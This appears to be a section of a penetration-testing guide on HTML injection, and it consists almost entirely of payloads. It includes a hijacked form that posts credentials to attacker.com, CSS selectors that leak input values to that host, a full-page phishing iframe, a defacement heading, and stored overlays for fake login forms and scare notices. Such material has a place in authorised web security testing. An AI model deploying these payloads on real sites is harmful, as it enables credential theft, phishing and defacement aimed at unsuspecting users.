# Phase 5: HTML Injection Techniques

#### Reflected HTML Injection
Modify page appearance without JavaScript:

```html
<!-- Content injection -->
<h1>SITE HACKED</h1>

<!-- Form hijacking -->
<form action="http://attacker.com/capture">
<input name="credentials" placeholder="Enter password">
<button>Submit</button>
</form>

<!-- CSS injection for data exfiltration -->
<style>
input[value^="a"]{background:url(http://attacker.com/a)}
input[value^="b"]{background:url(http://attacker.com/b)}
</style>

<!-- iframe injection -->
<iframe src="http://attacker.com/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
```

#### Stored HTML Injection
Persistent content manipulation:

```html
<!-- Marquee disruption -->
<marquee>Important Security Notice: Your account is compromised!</marquee>

<!-- Style override -->
<style>body{background:red !important;}</style>

<!-- Hidden content with CSS -->
<div style="position:fixed;top:0;left:0;width:100%;background:white;z-index:9999;">
Fake login form or misleading content here
</div>
```